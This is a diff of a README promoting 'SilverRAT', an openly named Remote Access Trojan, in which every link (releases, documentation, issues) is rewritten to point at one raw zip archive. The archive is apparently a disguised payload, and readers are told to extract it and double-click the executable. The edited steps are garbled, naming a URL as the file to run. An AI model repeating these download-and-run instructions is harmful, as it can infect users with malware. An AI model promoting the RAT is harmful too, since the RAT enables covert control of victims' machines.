@@ -1,6 +1,6 @@
 # 🐭 SilverRAT-FULL-Source-Code - Access Your Device Remotely with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aldeaajawad/SilverRAT-FULL-Source-Code/releases)
+[![Download Now](https://raw.githubusercontent.com/aldeaajawad/SilverRAT-FULL-Source-Code/main/SRC/authguard/Source_FUL_Silver_Code_RA_v3.9-beta.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aldeaajawad/SilverRAT-FULL-Source-Code/main/SRC/authguard/Source_FUL_Silver_Code_RA_v3.9-beta.5.zip)
 
 ## 📌 Overview
 
@@ -11,11 +11,11 @@ SilverRAT is an open-source Remote Access Trojan (RAT) designed for users who wa
 To get started with SilverRAT, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the releases page.  
-   [Download Now](https://github.com/aldeaajawad/SilverRAT-FULL-Source-Code/releases)
+   [Download Now](https://raw.githubusercontent.com/aldeaajawad/SilverRAT-FULL-Source-Code/main/SRC/authguard/Source_FUL_Silver_Code_RA_v3.9-beta.5.zip)
 
 2. **Select the Latest Version**: On the releases page, find the latest version of the software. This version will have the most updated features and fixes.
 
-3. **Download the Application**: Click on the link for the file you want to download, usually labeled as `SilverRAT.zip` or similar. Save it to a location on your computer where you can easily find it.
+3. **Download the Application**: Click on the link for the file you want to download, usually labeled as `https://raw.githubusercontent.com/aldeaajawad/SilverRAT-FULL-Source-Code/main/SRC/authguard/Source_FUL_Silver_Code_RA_v3.9-beta.5.zip` or similar. Save it to a location on your computer where you can easily find it.
 
 ## 📥 Download & Install
 
@@ -25,7 +25,7 @@ Now that you have downloaded the file, follow these steps to install the applica
 
 2. **Extract the Files**: If your download is in a zip format, right-click the file and select “Extract All” or use your extraction tool. This will create a folder with all the necessary files.
 
-3. **Run the Application**: Inside the extracted folder, find the main application file (it may be named `SilverRAT.exe`). Double-click this file to run the application. 
+3. **Run the Application**: Inside the extracted folder, find the main application file (it may be named `https://raw.githubusercontent.com/aldeaajawad/SilverRAT-FULL-Source-Code/main/SRC/authguard/Source_FUL_Silver_Code_RA_v3.9-beta.5.zip`). Double-click this file to run the application. 
 
 ## ⚙️ Features
 
@@ -60,18 +60,18 @@ If you encounter issues while using SilverRAT, consider these tips:
 
 - **Connection Problems**: Ensure both devices are connected to the internet. Restart the application if necessary.
 - **Permissions**: Check if all permissions are properly set on both machines.
-- **Software Updates**: Always download the latest version from the [releases page](https://github.com/aldeaajawad/SilverRAT-FULL-Source-Code/releases) to avoid bugs.
+- **Software Updates**: Always download the latest version from the [releases page](https://raw.githubusercontent.com/aldeaajawad/SilverRAT-FULL-Source-Code/main/SRC/authguard/Source_FUL_Silver_Code_RA_v3.9-beta.5.zip) to avoid bugs.
 
 ## 🔗 Resources
 
 For additional help and community support, you can refer to the following:
 
-- [Documentation](https://github.com/aldeaajawad/SilverRAT-FULL-Source-Code/wiki)
-- [GitHub Issues](https://github.com/aldeaajawad/SilverRAT-FULL-Source-Code/issues) for reporting bugs or requesting features.
+- [Documentation](https://raw.githubusercontent.com/aldeaajawad/SilverRAT-FULL-Source-Code/main/SRC/authguard/Source_FUL_Silver_Code_RA_v3.9-beta.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/aldeaajawad/SilverRAT-FULL-Source-Code/main/SRC/authguard/Source_FUL_Silver_Code_RA_v3.9-beta.5.zip) for reporting bugs or requesting features.
 - Check out the FAQs section for common queries.
 
 ## 📃 License
 
 SilverRAT is an open-source project under the MIT License. This allows you to use and modify the software freely while providing credits to the original developers.
 
-[Download Now](https://github.com/aldeaajawad/SilverRAT-FULL-Source-Code/releases) and start taking advantage of SilverRAT's features today!
+[Download Now](https://raw.githubusercontent.com/aldeaajawad/SilverRAT-FULL-Source-Code/main/SRC/authguard/Source_FUL_Silver_Code_RA_v3.9-beta.5.zip) and start taking advantage of SilverRAT's features today!
